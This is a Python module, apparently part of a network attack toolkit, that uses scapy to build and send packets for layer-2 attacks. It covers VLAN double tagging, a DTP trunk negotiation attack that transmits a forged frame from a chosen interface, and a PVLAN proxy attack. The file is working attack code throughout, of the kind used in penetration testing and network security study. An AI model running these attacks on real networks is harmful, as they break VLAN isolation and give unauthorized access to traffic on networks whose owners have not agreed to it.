########################################
#   vlan.py
#   Contains VLAN related attacks
#   Author: Duarte Matias
#   Last modified: 13/09/2022
########################################

from scapy.contrib.dtp import *
from scapy.layers.l2 import Dot3, SNAP, Dot1Q, Ether
from scapy.layers.inet import IP
from scapy.all import get_if_hwaddr, get_if_addr
from libs.aux_funcs import type_wrapper,attack_type,attack_cat,attack_layer, send_l2_single

###############
#   vlan_double_tagging()
#   Formats a packet for a vlan double tagging attack
###############
@type_wrapper(category=attack_cat.Middleware, name="Double Tagging", layer=attack_layer.L2, type=attack_type.Wrapper,arg_list=["vlan_in", "vlan_out"])
def vlan_double_tagging(args):
    """Adds Dot1Q headers to the packet, allowing a VLAN double tagging attack to be carried out. Requires vlan tag number for internal and external header."""
    vlan_in = args["vlan_in"]
    vlan_out = args["vlan_out"]
    args["pkt"] = Ether(type=0x8100, dst='ff:ff:ff:ff:ff:ff')/Dot1Q(vlan=vlan_out)/Dot1Q(vlan=vlan_in)
    return args

###############
#   vlan_dtp_attack()
#   Performs a DTP Trunk negotiation attack from the selected interface
###############
@type_wrapper(category=attack_cat.Attack, name= "DTP Trunk Negotiation", type=attack_type.SingleUse, layer=attack_layer.L2, arg_list=["interface"])
def vlan_dtp_attack(args):
    '''Performs a DTP Trunk negotiation attack from the selected interface'''
    interface = args["interface"]
    args['pkt'] = Dot3(src=get_if_hwaddr(interface), dst="01:00:0c:cc:cc:cc")/SNAP()/DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor(neighbor=get_if_hwaddr(interface))])
    send_l2_single(args)


###############
#   vlan_pvlan_proxy()
#   Formats a packet for a PVLAN Proxy attack
###############
@type_wrapper(category=attack_cat.Middleware, name="PVLAN Proxy", type=attack_type.Wrapper, layer=attack_layer.L2, arg_list = ["interface", "target_ip", "target_mac"])
def vlan_pvlan_proxy(args):
    '''Formats a packet for a PVLAN proxy attack. Requires the MAC address of the network's gateway, and the IP adress of the target'''
    interface = args["interface"]
    target_ip = args["target_ip"]
    target_mac = args["target_mac"]
    args["pkt"] = Ether(src=get_if_hwaddr(interface), dst=target_mac)/IP(src=get_if_addr(interface), dst=target_ip)
    return args